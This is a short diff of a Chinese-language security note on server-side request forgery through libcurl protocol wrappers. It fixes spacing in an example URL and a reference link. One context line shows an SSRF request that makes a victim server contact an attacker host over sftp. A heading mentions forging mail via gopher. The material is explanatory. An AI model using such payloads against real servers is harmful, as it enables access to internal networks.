@@ -1,6 +1,6 @@
 ## SSRF libcurl protocol wrappers
 
-参数url没有做限制，可以访问内网地址。请求过程中使用到了liburl库，并且liburl配置不当，可以让攻击者使用除http(s)之外的多个libcurl protocol wrappers，比如ftp://xxx.com/file会让服务器发起ftp请求
+参数url没有做限制，可以访问内网地址。请求过程中使用到了liburl库，并且liburl配置不当，可以让攻击者使用除http(s)之外的多个libcurl protocol wrappers，比如 ftp: //xxx.com/file 会让服务器发起ftp请求
 
 参考：
 
@@ -85,7 +85,7 @@ http://victim:8084/ssrf_curl.php?url=sftp://attacker:2222/
 
 ## 利用GOPHER协议伪造发送邮件
 
-参见 [SSRF libcurl protocol wrappers利用分析]
+参见 [SSRF libcurl protocol wrappers利用分析][1]
 
 [1]: http://drops.wooyun.org/papers/13948
 [2]: http://drops.wooyun.org/web/9845
